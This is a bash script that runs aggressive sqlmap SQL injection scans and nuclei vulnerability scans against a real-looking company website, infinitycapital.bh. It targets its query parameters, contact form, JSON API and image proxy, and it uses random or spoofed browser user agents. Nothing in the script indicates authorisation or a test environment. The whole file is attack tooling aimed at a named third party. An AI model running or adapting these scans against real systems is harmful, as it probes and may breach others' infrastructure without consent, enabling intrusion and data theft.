#!/bin/bash
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'
T='https://www.infinitycapital.bh'
echo "######## SQLMAP /?zzz=1 ########"
sqlmap -u "$T/?zzz=1" --batch --level=5 --risk=3 --threads=4 --timeout=15 \
  --technique=BEUSTQ -p 'zzz,page,id,search' --random-agent --output-dir=/tmp/sq1 2>&1 | grep -Ei 'inject|payload|parameter|not injectable|heuristic|CRITICAL|WARNING.*vuln' | head -25
echo "######## SQLMAP /?id=1&search=test&page=2 ########"
sqlmap -u "$T/?id=1&search=test&page=2" --batch --level=5 --risk=3 --threads=4 --timeout=15 \
  --technique=BEUSTQ -p 'id,search,page' --random-agent --output-dir=/tmp/sq2 2>&1 | grep -Ei 'inject|payload|parameter|not injectable|heuristic|CRITICAL|WARNING.*vuln' | head -25
echo "######## SQLMAP /contact (POST shape) ########"
sqlmap -u "$T/contact" --batch --level=3 --risk=2 --threads=4 --timeout=15 \
  --data='fname=D10&lname=P&telInput=+97336000000&cname=d10&msgTxt=hello&check=1' \
  --random-agent --output-dir=/tmp/sq3 2>&1 | grep -Ei 'inject|payload|parameter|not injectable|heuristic|CRITICAL' | head -25
echo "######## SQLMAP /api/send (JSON) ########"
sqlmap -u "$T/api/send" --batch --level=3 --risk=2 --threads=4 --timeout=15 \
  --data='{"fname":"D10","msgTxt":"hello","check":"1"}' \
  --headers='Content-Type: application/json' --random-agent --output-dir=/tmp/sq4 2>&1 | grep -Ei 'inject|payload|parameter|not injectable|heuristic|CRITICAL' | head -25
echo "######## NUCLEI ########"
nuclei -u "https://www.infinitycapital.bh/" -H "User-Agent: $UA" -silent -duc -no-update-templates \
  -severity critical,high,medium -stats 2>&1 | tail -35
echo "######## NUCLEI on /contact and /_next/image ########"
nuclei -u "https://www.infinitycapital.bh/contact" -H "User-Agent: $UA" -silent -duc -no-update-templates -severity critical,high,medium 2>&1 | tail -20
nuclei -u "https://www.infinitycapital.bh/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=640&q=75" -H "User-Agent: $UA" -silent -duc -no-update-templates -severity critical,high,medium 2>&1 | tail -20
echo DONE
